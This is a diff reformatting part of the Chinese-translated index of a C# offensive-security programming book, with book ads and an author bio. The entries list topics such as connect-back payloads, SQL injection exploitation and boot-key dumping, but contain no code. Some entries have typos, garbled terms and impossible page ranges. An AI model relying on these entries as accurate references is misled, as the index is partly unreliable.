-NexposeSession 类, 118–124
-API 身份验证, 124
-Dispost() 方法, 123
-ExecuteCommand() 方法, 120–123
-查找 API 版本, 123–124
-Logout() 方法, 121–123
-PDF 站点报告, 128, 130
-执行扫描, 129
-NodeKey 类 (注册表配置单元), 250, 253–257
+- `Name` 属性（`SoapMessage` 类），59，61
+- 命名空间
+  - 已定义，3
+  - SOAP XML，76
+  - `System.Linq` 命名空间，84
+  - XML，56–57
+- 相关库，12–13。另见 x86 汇编库，241。另见托管程序（managed assemblies）
+- `Nessus`，103–104
+  - `NessusManager` 类，109–110
+  - `NessusSession` 类，105–109
+  - HTTP 请求，106–107
+  - 登录，107–108
+  - 测试，108–109
+  - 执行扫描，110–113
+  - REST 架构和，104–105
+- `.NET` 库。见托管程序（managed assemblies）
+- 网络流绑定载荷，85–88
+- 反弹载荷（payloads），82–84
+- `NewTask()` 方法（`SqlmapManager` 类），178–179
+- 暴露，115
+- 自动化漏洞扫描，126–127，130
+- 安装，116–118
+- `NexposeManager` 类，124–125
+- `NexposeSession` 类，118–124
+  - API 身份验证，124
+  - `Dispost()` 方法，123
+  - `ExecuteCommand()` 方法，120–123
+  - 查找 API 版本，123–124
+  - `Logout()` 方法，121–123
+- PDF 站点报告，128，130
+- 执行扫描，129
+- `NodeKey` 类（注册表配置单元），250，253–257
 
 # O
 
-面向面向的语言, 3
-对象关系映射 (ORM) 库, 20, 242–244
-对象, 已定义, 4
-OMP (OpenVAS 管理协议), 133
-OpenVAS, 133
-安装, 134
-OpenVASManager 类, 140–145
-自动化, 144–145
-CreateSimpleTarget() 方法, 141–142
-CreateSimpleTask() 方法, 143
-GetScanConfigurations() 方法, 141–142
-GetTaskResults() 方法, 143–144
-GetTasks() 方法, 143–144
-StartTask() 方法, 143
-OpenVASSession 类, 134–139
-认证, 135–136
-ExecuteCommand() 方法, 136–137
-get_version 命令, 139
-GetStream() 方法, 138
-ReadMessage() 方法, 137–138
-SSL 证书验证, 138–139
-OpenVAS 管理协议 (OMP), 133
-可选参数, 10–11
-ORD() SQL 函数, 46
-ORM (对象关系映射) 库, 20, 242–244
-OS
-ClamAV 库, 192, 196
-.NET 反编译器程序, 242
-Xamarin Studio, 2
+- 面向面向的语言，3
+- 对象关系映射（ORM）库，20，242–244
+- 对象，已定义，4
+- OMP（OpenVAS 管理协议），133
+- OpenVAS，133
+  - 安装，134
+  - `OpenVASManager` 类，140–145
+  - 自动化，144–145
+  - `CreateSimpleTarget()` 方法，141–142
+  - `CreateSimpleTask()` 方法，143
+  - `GetScanConfigurations()` 方法，141–142
+  - `GetTaskResults()` 方法，143–144
+  - `GetTasks()` 方法，143–144
+  - `StartTask()` 方法，143
+  - `OpenVASSession` 类，134–139
+  - 认证，135–136
+  - `ExecuteCommand()` 方法，136–137
+  - `get_version` 命令，139
+  - `GetStream()` 方法，138
+  - `ReadMessage()` 方法，137–138
+  - SSL 证书验证，138–139
+- OpenVAS 管理协议（OMP），133
+- 可选参数，10–11
+- `ORD()` SQL 函数，46
+- ORM（对象关系映射）库，20，242–244
+- OS
+  - `ClamAV` 库，192，196
+  - `.NET` 反编译器程序，242
+  - `Xamarin Studio`，2
 
 # P
 
-+ Packer 类 (Metasploit), 214
-参数, 模糊测试, 29–31
-Parameters 属性 (SoapMessage 类), 59
-父类, 已定义, 4
-ParseChildNodes() 方法 (NodeKey 类), 256–257
-ParseMessages() 方法 (WSDL 类构造函数), 57–58, 62
-反弹载荷, 83
-int.Parse() 方法, 83, 176
-long.Parse() 方法, 176
-ParseChildNodes() 方法, 256–257
-ParseMessages() 方法 (WSDL 类构造函数), 57–58, 56
-ParseType() 方法, 56–57
-short.Parse() 方法, 176
-ParseTypes() 方法 (WSDL 类构造函数), 56–57
-解析
-注册表配置单元, 252–259
-WSDL XML 文档, 55–67
-SoapBinding 类, 64–65
-SoapBindingOperation 类, 65–66
-SoapMessage 类, 60–61
-SoapMessagePart 类, 61–62
-SoapOperation 类, 63–64
-SoapPortType 类, 62–63
-SoapService 类, 66–67
-SoapType 类, 58–60
-编写初始解析方法, 56–58
-WSDL 类构造函数, 55–56
-载荷 (payloads), 81–82
-绑定, 85–88
-接收数据, 86
-执行流命令, 87–88
-返回输出, 87
-反弹载荷, 82–85
-网络流, 82–84
-运行命令, 84–85
-Metasploit Linux, 94–102
-执行原生 Linux, 98–102
-作为未托管代码执行原生载荷, 96–98
-生成, 96
-设置, 94
-使用 UDP 攻击网络, 88
-攻击者代码, 92–94
-目标机器代码, 89
-PDF 站点报告 (Nexpose), 128, 130
-Platform Invoke (P/Invoke), 12, 193
-端口 (WSDL), 55
-HTTP POST 端口, 72–75
-SOAP malign() 函数, 99–101
-POST 参数, 发到 SOAP 服务, 74–75
-POST 请求
-模糊测试, 25–27
-参数, 29–31
-写入请求, 27–29
-集成 sqlmap 工具, 187–188
-sqlmap REST API, 170–172
-Process 类
-绑定载荷, 87–88
-反弹载荷, 84–85
-通过 UDP 攻击网络, 91
-ProcessInfo 类
-绑定载荷, 87–88
-反弹载荷, 84–85
-通过 UDP 攻击网络, 91
-属性, 已定义, 4
-Python
-以及 Cuckoo Sandbox, 147, 149
-sqlmap, 168, 170
+- `Packer` 类（Metasploit），214
+- 参数，模糊测试，29–31
+- `Parameters` 属性（`SoapMessage` 类），59
+- 父类，已定义，4
+- `ParseChildNodes()` 方法（`NodeKey` 类），256–257
+- `ParseMessages()` 方法（WSDL 类构造函数），57–58，62
+- 反弹载荷，83
+- `int.Parse()` 方法，83，176
+- `long.Parse()` 方法，176
+- `ParseChildNodes()` 方法，256–257
+- `ParseMessages()` 方法（WSDL 类构造函数），57–58，56
+- `ParseType()` 方法，56–57
+- `short.Parse()` 方法，176
+- `ParseTypes()` 方法（WSDL 类构造函数），56–57
+- 解析
+  - 注册表配置单元，252–259
+  - WSDL XML 文档，55–67
+  - `SoapBinding` 类，64–65
+  - `SoapBindingOperation` 类，65–66
+  - `SoapMessage` 类，60–61
+  - `SoapMessagePart` 类，61–62
+  - `SoapOperation` 类，63–64
+  - `SoapPortType` 类，62–63
+  - `SoapService` 类，66–67
+  - `SoapType` 类，58–60
+  - 编写初始解析方法，56–58
+  - WSDL 类构造函数，55–56
+- 载荷（payloads），81–82
+  - 绑定，85–88
+  - 接收数据，86
+  - 执行流命令，87–88
+  - 返回输出，87
+  - 反弹载荷，82–85
+  - 网络流，82–84
+  - 运行命令，84–85
+- Metasploit Linux，94–102
+  - 执行原生 Linux，98–102
+  - 作为未托管代码执行原生载荷，96–98
+  - 生成，96
+  - 设置，94
+- 使用 UDP 攻击网络，88
+  - 攻击者代码，92–94
+  - 目标机器代码，89
+- PDF 站点报告（Nexpose），128，130
+- Platform Invoke（P/Invoke），12，193
+- 端口（WSDL），55
+- HTTP POST 端口，72–75
+- SOAP `malign()` 函数，99–101
+- POST 参数，发到 SOAP 服务，74–75
+- POST 请求
+  - 模糊测试，25–27
+  - 参数，29–31
+  - 写入请求，27–29
+  - 集成 `sqlmap` 工具，187–188
+  - `sqlmap` REST API，170–172
+- `Process` 类
+  - 绑定载荷，87–88
+  - 反弹载荷，84–85
+  - 通过 UDP 攻击网络，91
+- `ProcessInfo` 类
+  - 绑定载荷，87–88
+  - 反弹载荷，84–85
+  - 通过 UDP 攻击网络，91
+- 属性，已定义，4
+- Python
+  - 以及 Cuckoo Sandbox，147，149
+  - `sqlmap`，168，170
 
 # R
 
-+ Rapid7
-Metasploit, 94
-Nexpose, 115–116
-ReadChildrenNodes() 方法 (NodeKey 类), 255–256
-ReadChildValues() 方法 (NodeKey 类), 257
-ReadIn32() 方法 (NodeKey 类), 255
-ReadMessage() 方法
-ArachnRPCSession 类, 233, 235
-OpenVASession 类, 137–138
-ReadNodeStructure() 方法 (NodeKey 类), 254–255
-Regex 类 (SQL 注入), 42–43
-RegistryHive 类, 252–253
-注册表配置单元, 249–250
-转储启动密钥, 259–264
-GetAsyncKeyState(方法), 259–261, 262–263
-NodeKey(方法), 261–262
-GetValue(方法), 261
-StringToByteArray(方法), 262
-验证启动密钥, 263–254
-导出, 250–252
-读取, 252–259
-NodeKey 类, 253–257
-RegistryHive 类, 252–253
-ValueKey 类, 258–259
-...结构, 250
-测试, 259
-远程 API。见 RPC API
-REST（表现状态传输）架构。另见
-sqlmap 工具以及 Arachni, 224–228
-以及 Cuckoo Sandbox, 148–150
-Nessus 以及, 104–105
-sqlmap, 169–170
-RLIKE 关键字 (SQL 注入), 43–44
-调用方法, 50–51
-创建真假响应, 44
-GetValue() 方法, 49–50
-MakeRequest() 方法, 47
-打印值, 50–51
-获取值的长度, 47–49
-evenuserdb 表, 45–47
-用于匹配搜索条件, 44–55
-根节点密钥 (注册表配置单元), 250
-RPC (远程过程调用) API Arachni, 228–237
-ArachniRPCManager 类, 236–237
-ArachnRPCSession 类, 230–234
-ExecuteCommand() 方法, 234–235
-手动运行, 229–230
-Metasploit, 208–209
-Ruby 编程语言
-Arachni Web 应用, 223
-Metasploit, 94–96
-Ruby 版本管理器 (RVM), 95
+- Rapid7
+  - Metasploit，94
+  - Nexpose，115–116
+- `ReadChildrenNodes()` 方法（`NodeKey` 类），255–256
+- `ReadChildValues()` 方法（`NodeKey` 类），257
+- `ReadIn32()` 方法（`NodeKey` 类），255
+- `ReadMessage()` 方法
+  - `ArachnRPCSession` 类，233，235
+  - `OpenVASession` 类，137–138
+- `ReadNodeStructure()` 方法（`NodeKey` 类），254–255
+- `Regex` 类（SQL 注入），42–43
+- `RegistryHive` 类，252–253
+- 注册表配置单元，249–250
+  - 转储启动密钥，259–264
+  - `GetAsyncKeyState()` 方法，259–261，262–263
+  - `NodeKey()` 方法，261–262
+  - `GetValue()` 方法，261
+  - `StringToByteArray()` 方法，262
+  - 验证启动密钥，263–254
+  - 导出，250–252
+  - 读取，252–259
+  - `NodeKey` 类，253–257
+  - `RegistryHive` 类，252–253
+  - `ValueKey` 类，258–259
+  - ...结构，250
+  - 测试，259
+- 远程 API。见 RPC API
+- REST（表现状态传输）架构。另见
+  - `sqlmap` 工具以及 Arachni，224–228
+  - 以及 Cuckoo Sandbox，148–150
+  - Nessus 以及，104–105
+  - `sqlmap`，169–170
+- `RLIKE` 关键字（SQL 注入），43–44
+  - 调用方法，50–51
+  - 创建真假响应，44
+  - `GetValue()` 方法，49–50
+  - `MakeRequest()` 方法，47
+  - 打印值，50–51
+  - 获取值的长度，47–49
+  - `evenuserdb` 表，45–47
+  - 用于匹配搜索条件，44–55
+- 根节点密钥（注册表配置单元），250
+- RPC（远程过程调用）API Arachni，228–237
+  - `ArachniRPCManager` 类，236–237
+  - `ArachnRPCSession` 类，230–234
+  - `ExecuteCommand()` 方法，234–235
+  - 手动运行，229–230
+- Metasploit，208–209
+- Ruby 编程语言
+  - Arachni Web 应用，223
+  - Metasploit，94–96
+- Ruby 版本管理器（RVM），95
 
 # S
 
-ScanFile() 方法 (ClamEngine 类), 198–200
-Scan() 方法 (ClamdManager 类), 205
-扫描
-ClAV 库, 198–200
-在 Nessus 中, 110–113
-在 Nextpose 中, 126–127, 129
-ysqlmap 扫描日志, 172
-ScanSite() 方法 (NextposeManager 类), 127
-SDLC (软件开发生命周期), 224
-SelectNodes() (WSDL 类构造函数), 57
-SELinux, 100
-SerializeObject() 方法
-SDLC (软件开发生命周期), 224
-SerializeObject() 方法，与 Metasploit 交互, 94
-SELinux, 100
-Split() 方法 (反弹载荷), 84
-SQL (结构化语言)。见 SQL 注入
-SQL (结构化语言) 工具, 19–20
-利用布尔型 SQL 注入, 43
-SQL (结构化语言) 工具, 19–20
-
-
-
-
-ArachniHTTPManager 类, 227–228
-ArachniRPCManager 类, 237
-StartTask() 方法
-OpenVASManager 类, 143
-SqlmapManager 类, 180
-有状态协议, 85–88
-无状态协议, 88
-静态站点 (Nexpose) 类构造函数 (回连载荷), 83
-StreamReader ReadLine() 方法 (回连载荷), 83
-string-types 选项 (monodis 程序), 245
-StringToByteArray() 方法, 262
-结构化查询语言。*参见 SQL 注入；sqlmap 工具子类化, 4–6*
-System.Linq 命名空间 (回连载荷), 84
+- `ScanFile()` 方法（`ClamEngine` 类），198–200
+- `Scan()` 方法（`ClamdManager` 类），205
+- 扫描
+  - `ClAV` 库，198–200
+  - 在 Nessus 中，110–113
+  - 在 Nextpose 中，126–127，129
+  - `ysqlmap` 扫描日志，172
+- `ScanSite()` 方法（`NextposeManager` 类），127
+- SDLC（软件开发生命周期），224
+- `SelectNodes()`（WSDL 类构造函数），57
+- SELinux，100
+- `SerializeObject()` 方法
+  - SDLC（软件开发生命周期），224
+  - `SerializeObject()` 方法，与 Metasploit 交互，94
+- SELinux，100
+- `Split()` 方法（反弹载荷），84
+- SQL（结构化语言）。见 SQL 注入
+- SQL（结构化语言）工具，19–20
+- 利用布尔型 SQL 注入，43
+- SQL（结构化语言）工具，19–20
+- `ArachniHTTPManager` 类，227–228
+- `ArachniRPCManager` 类，237
+- `StartTask()` 方法
+  - `OpenVASManager` 类，143
+  - `SqlmapManager` 类，180
+- 有状态协议，85–88
+- 无状态协议，88
+- 静态站点（Nexpose）类构造函数（回连载荷），83
+- `StreamReader.ReadLine()` 方法（回连载荷），83
+- `string-types` 选项（`monodis` 程序），245
+- `StringToByteArray()` 方法，262
+- 结构化查询语言。参见 SQL 注入；`sqlmap` 工具
+- 子类化，4–6
+- `System.Linq` 命名空间（回连载荷），84
 
 # T
 
-TaskFactory 类 (Cuckoo 沙箱), 162
-TCP (传输控制协议) 载荷, 81–82
-- 绑定 (binding), 85–88
-- 回连载荷 (connect-back payload), 82–85
-- 与 UDP，88–89
-TcpClient 类
-- clamd 进程, 203
-- 回连载荷, 82–84
-TcpListener 类 (绑定载荷), 85–86
-Tenable 网络安全, 103
-TestRequestWithSqlmap() 方法 (SOAP 模糊测试器), 185–187
-测试
-- ClAVAV 库, 200–201
-- clamd 进程, 205–206
-- GetBootKey() 方法, 263
-- JSON 模糊测试器, 37–38
-- MetasploitSession 类, 217
-- NessusSession 类, 108–109
-- Nexpose, 118
-- 注册表单元 (registry hives), 259
-
-SqlSession 类, 176–177
-TestPostRequestWithSqlmap() (SOAP 模糊测试器), 187–188
-Time 属性 (SqlmapLogProfile 类), 183
-TLS (传输层安全), 121
-传输控制协议。参见 TCP
+- `TaskFactory` 类（Cuckoo 沙箱），162
+- TCP（传输控制协议）载荷，81–82
+  - 绑定（binding），85–88
+  - 回连载荷（connect-back payload），82–85
+  - 与 UDP，88–89
+- `TcpClient` 类
+  - `clamd` 进程，203
+  - 回连载荷，82–84
+- `TcpListener` 类（绑定载荷），85–86
+- Tenable 网络安全，103
+- `TestRequestWithSqlmap()` 方法（SOAP 模糊测试器），185–187
+- 测试
+  - `ClAVAV` 库，200–201
+  - `clamd` 进程，205–206
+  - `GetBootKey()` 方法，263
+  - JSON 模糊测试器，37–38
+  - `MetasploitSession` 类，217
+  - `NessusSession` 类，108–109
+  - Nexpose，118
+  - 注册表单元（registry hives），259
+- `SqlSession` 类，176–177
+- `TestPostRequestWithSqlmap()`（SOAP 模糊测试器），187–188
+- `Time` 属性（`SqlmapLogProfile` 类），183
+- TLS（传输层安全），121
+- 传输控制协议。参见 TCP
 
 # U
 
-- Ubuntu, 94
-UDP (用户数据报协议)
-- 与 TCP，88–89
-- 使用于攻击网络, 88–94
-- 攻击者代码, 92–94
-- 目标机器代码, 89–91
-UpdClient, 89
-基于联合的 SQL 注入
-- 手动执行利用，38–40
-- 程序化执行利用，40–43
-- 使用载荷构建 URL, 41–42
-- 创建标记以查找用户名和密码, 41
-- 发送 HTTP 请求, 42–43
-- 非托管代码, 96–98
-用户数据报协议。参见 UDP
+- Ubuntu，94
+- UDP（用户数据报协议）
+  - 与 TCP，88–89
+  - 使用于攻击网络，88–94
+  - 攻击者代码，92–94
+  - 目标机器代码，89–91
+- `UpdClient`，89
+- 基于联合的 SQL 注入
+  - 手动执行利用，38–40
+  - 程序化执行利用，40–43
+  - 使用载荷构建 URL，41–42
+  - 创建标记以查找用户名和密码，41
+  - 发送 HTTP 请求，42–43
+- 非托管代码，96–98
+- 用户数据报协议。参见 UDP
 
 # V
 
-- ValidateServerCertificate() 方法 (ArachniRPCSession 类), 233
-ValueKey (注册表单元), 250, 258–269
-VirtualAlloc() 函数, 96–98
-VirtualBox 虚拟化软件, 16, 209。另参见 VMs 虚拟机。参见 VMs
-Visual Studio IDE (微软), 1–2
-VMs (虚拟机), 12–13
-- 添加主机专用虚拟网络, 16
-- 从 BadStore ISO 启动, 17–18
-- 创建, 17
-漏洞扫描器
-- Nessus, 103–113
-
-NessManager 类, 109–110
-NessSession 类, 105–109
-- 执行扫描, 110–113
-- REST 架构和, 104–105
-Nexpose, 115–131
-- 自动化漏洞扫描, 126–127, 130
-- 安装, 116–118
-NexposeManager 类, 124–125
-NexposeSession 类, 118–124
-- PDF 站点报告, 128, 130
-- 执行扫描, 129
-OpenVAS, 134–145
-- 安装, 134
-OpenVASManager 类, 140–145
-OpenVASSession 类, 134–139
+- `ValidateServerCertificate()` 方法（`ArachniRPCSession` 类），233
+- `ValueKey`（注册表单元），250，258–269
+- `VirtualAlloc()` 函数，96–98
+- `VirtualBox` 虚拟化软件，16，209。另参见 VMs
+- 虚拟机。参见 VMs
+- Visual Studio IDE（微软），1–2
+- VMs（虚拟机），12–13
+  - 添加主机专用虚拟网络，16
+  - 从 BadStore ISO 启动，17–18
+  - 创建，17
+- 漏洞扫描器
+  - Nessus，103–113
+    - `NessManager` 类，109–110
+    - `NessSession` 类，105–109
+    - 执行扫描，110–113
+    - REST 架构和，104–105
+  - Nexpose，115–131
+    - 自动化漏洞扫描，126–127，130
+    - 安装，116–118
+    - `NexposeManager` 类，124–125
+    - `NexposeSession` 类，118–124
+    - PDF 站点报告，128，130
+    - 执行扫描，129
+  - OpenVAS，134–145
+    - 安装，134
+    - `OpenVASManager` 类，140–145
+    - `OpenVASSession` 类，134–139
 
 # W
 
-Web 服务描述语言 XML 文档解析。参见 WSDL XML 文档解析，while 循环
-- 回连载荷, 83
-- 通过 UDP 进行网络攻击, 89–90
-Windows
-- ClamAV 库, 192, 196
-- 将原生 Windows 载荷作为非托管代码执行, 96–98
-- 生成 Metasploit 载荷, 96
-ILSpy 反编译器器, 242
-- kernel32.dll 库, 96–97
-- MessageBox() 函数, 13
-- 注册表单元, 249–250
-- 倾储启动密钥, 259–264
-- 导出, 250–252
-- 读取, 252–259
-- 结构, 250
-- 测试, 259
-WSDL (Web 服务描述语言) XML 文档解析, 55
-- 类构造函数, 55–56
-SoapBinding 类, 64–45
-
-SoapBindingOperation 类, 65–66
-SoapMessage 类, 60–61
-SoapMessagePart 类, 61–62
-SoapOperation 类, 63–64
-SoapPort 类, 62
-SoapType 类, 58
-编写
-,方法, 60
+- Web 服务描述语言 XML 文档解析。参见 WSDL XML 文档解析
+- `while` 循环
+  - 回连载荷，83
+  - 通过 UDP 进行网络攻击，89–90
+- Windows
+  - `ClamAV` 库，192，196
+  - 将原生 Windows 载荷作为非托管代码执行，96–98
+  - 生成 Metasploit 载荷，96
+- `ILSpy` 反编译器，242
+- `kernel32.dll` 库，96–97
+- `MessageBox()` 函数，13
+- 注册表单元，249–250
+  - 倾储启动密钥，259–264
+  - 导出，250–252
+  - 读取，252–259
+  - 结构，250
+  - 测试，259
+- WSDL（Web 服务描述语言）XML 文档解析，55
+  - 类构造函数，55–56
+  - `SoapBinding` 类，64–45
+  - `SoapBindingOperation` 类，65–66
+  - `SoapMessage` 类，60–61
+  - `SoapMessagePart` 类，61–62
+  - `SoapOperation` 类，63–64
+  - `SoapPort` 类，62
+  - `SoapType` 类，58
+  - 编写方法，60
 
 # X
 
-- x86_64 汇编, 241。另见 assemblies Studio IDE, 2
-- Element 类 (SOAP), 76
-- XML 节点, 59
-- XPath 查询, 57–58
-- XSS (跨站脚本), 20–22
+- x86_64 汇编，241。另见 assemblies
+- Studio IDE，2
+- `Element` 类（SOAP），76
+- XML 节点，59
+- XPath 查询，57–58
+- XSS（跨站脚本），20–22
 
-PRACTICAL PACKET ANALYSIS, 3RD EDITION Using Wireshark to Solve Real-World Problems by CHRIS SANDERS
-APRIL 2017, 368 PP., $49.95
+## 推荐阅读
+
+### Practical Packet Analysis, 3rd Edition
+
+**Using Wireshark to Solve Real-World Problems**  
+by CHRIS SANDERS
+
+APRIL 2017，368 PP.，$49.95  
 ISBN
 
-THE HARDWARE HACKER Adventures in Making and Breaking by ANDREW “BUNNIE” HUANG
-MARCH 2017, 416 PP., $29.95
+### The Hardware Hacker
+
+**Adventures in Making and Breaking**  
+by ANDREW “BUNNIE” HUANG
+
+MARCH 2017，416 PP.，$29.95  
 ISBN 978-1-5927
 
-BLACK HAT PYTHON Python Programming for Hackers and Pentesters by JUSTIN SEITZ
-DECEMBER 2014, 192 PP., $34.95
+### Black Hat Python
+
+**Python Programming for Hackers and Pentesters**  
+by JUSTIN SEITZ
+
+DECEMBER 2014，192 PP.，$34.95  
 ISBN 978-1-5927
 
-| 电话: | 邮箱: |
+| 电话 | 邮箱 |
 | --- | --- |
 | 1.800.420.7240 或 415.863.9900 | SALES@NOSTARCH.COM |
-| 网址: WWW.NOSTARCH.COM | |
+| 网址：WWW.NOSTARCH.COM | |
 
-“准备好迎接 C# 的攻防狂野之旅。”——Matt Graeber，微软 MVP
+> “准备好迎接 C# 的攻防狂野之旅。”——Matt Graeber，微软 MVP
 
-关于作者
+## 关于作者
 
-Brandon Perry 自开源 .NET 实现 Mono 出现以来一直在编写 C# 程序。在空闲，他喜欢为 Metasploit 框架编写模块、解析二进制文件并进行模糊测试。他是《Wicked Cool Shell Scripts, Second Edition》（No Starch Press）的合著者。他管理自己的软件和其他项目 https://volatileinds.net/
+Brandon Perry 自开源 `.NET` 实现 Mono 出现以来一直在编写 C# 程序。在空闲，他喜欢为 Metasploit 框架编写模块、解析二进制文件并进行模糊测试。他是《Wicked Cool Shell Scripts, Second Edition》（No Starch Press）的合著者。他管理自己的软件和其他项目：<https://volatileinds.net/>
 
-“我可以平平放置。” 这本书使用了耐用的装订，不会自动合上。
+> “我可以平平放置。”这本书使用了耐用的装订，不会自动合上。
 
 # 脚注
 
 # 第 8 章：自动化 Cuckoo 沙箱
 
-+   1. http://www.briangrinstead.com/blog/multipart-form-post-in-c/
-
+1. <http://www.briangrinstead.com/blog/multipart-form-post-in-c/>
